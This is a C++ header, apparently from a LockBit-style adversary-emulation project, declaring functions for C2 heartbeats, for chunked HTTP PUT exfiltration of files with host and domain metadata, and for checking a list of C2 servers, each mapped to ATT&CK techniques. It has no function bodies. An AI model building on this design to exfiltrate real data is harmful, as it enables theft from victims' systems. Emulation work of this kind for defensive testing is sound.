#include "logger.hpp"
#include "settings.hpp"
#include "xor_string.hpp"
#include "hash_string.hpp"
#include <stdio.h>
#include <format>
#include <iostream>


namespace network {

    namespace httpcoms {
        /*
         * HTTPRequestHeartbeat:
         *      About:
         *          Take a C2 server (std::string) and validates that the server is alive/replying with the "magic value by sending a GET request to the "/bs/portal" URI
         *      Result:
         *          a bool returned based on the result of the C2 server
         *      Returns:
         *          bool
         *      MITRE ATT&CK Techniques:
         *          T1071.001 Application Layer Protocol: Web Protocols
         *      CTI:
         *          https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf
         *          https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/
         *      Other References:
         *          n/a
         */
        bool HTTPRequestHeartbeat(std::string C2_SERVER);

        /*
         * HTTPRequestPUT:
         *      About:
         *          takes a string (filepath) and vector<unsigned char> (request body) as arguments.
         *          The function runs a DJB2 hash algorithm against the file path to create a unique URI path for the file on the C2 server.
         *          The body contains information such as the file chuck size, the hostname, a unique malware identifier and the computers domain name.
         *      Result:
         *          An HTTP PUT request is made with the data provided to the C2 server.
         *      Returns:
         *          bool
         *      MITRE ATT&CK Techniques:
         *          T1041 - Exfiltration Over C2 Channel
         *      CTI:
         *          https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf
         *          https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/
         *      Other References:
         *          n/a
         */
        bool HTTPRequestPUT(const std::string& filePath, const std::vector<unsigned char>& body);

	}

    /*
     * UploadFilePUTRequest:
     *      About:
     *          This function takes the required information provided from CTI (domain name, computername) and the file information.
     *          It then chunks the data based on a predetermined chunk size and prepends the metadata headers.
     *          It finally, loops on the HTTPRequestPUT function sending chunks until a full file is sent.
     *      Result:
     *          Sends a file in chunks to the C2 server
     *      Returns:
     *          bool
     *      MITRE ATT&CK Techniques:
     *          T1041 - Exfiltration Over C2 Channel
     *      CTI:
     *          https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf
     *          https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/
     *      Other References:
     *          n/a
     */
    bool UploadFilePUTRequest(const std::string& filePath, const std::vector<unsigned char>& fileData, const int& bytesTransferred);

    namespace utilities {
        /*
        * ValidateC2Servers:
        *      About:
        *          loops over the C2 servers from the config file and verifies if they are available using a heartbeat request
        *      Result:
        *          Updates the C2_SERVERS vector with servers that reply with the "magic" response
        *      Returns:
        *          void
        *      MITRE ATT&CK Techniques:
        *          T1071.001 Application Layer Protocol: Web Protocols
        *      CTI:
        *          https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/
        *      Other References:
        *          n/a
        */
        void ValidateC2Servers();
        /*
        * CreateDataBlobFromVector:
        *      About:
        *          Takes a vector and combines it with a uint32_t size 
        *      Result:
        *          returns a modified vector containing the data and the data size.
        *      Returns:
        *          std::vector<unsigned char>
        *      MITRE ATT&CK Techniques:
        *          n/a
        *      CTI:
        *          n/a
        *      Other References:
        *          n/a
        */
        std::vector<unsigned char> CreateDataBlobFromVector(const std::vector<unsigned char>& data);

        /*
        * CreateDataBlobFromString:
        *      About:
        *          Takes a string and combines it with a uint32_t size
        *      Result:
        *          returns a vector containing the data and the data size.
        *      Returns:
        *          std::vector<unsigned char>
        *      MITRE ATT&CK Techniques:
        *          n/a
        *      CTI:
        *          n/a
        *      Other References:
        *          n/a
        */
        std::vector<unsigned char> CreateDataBlobFromString(const std::string& data);
    }
}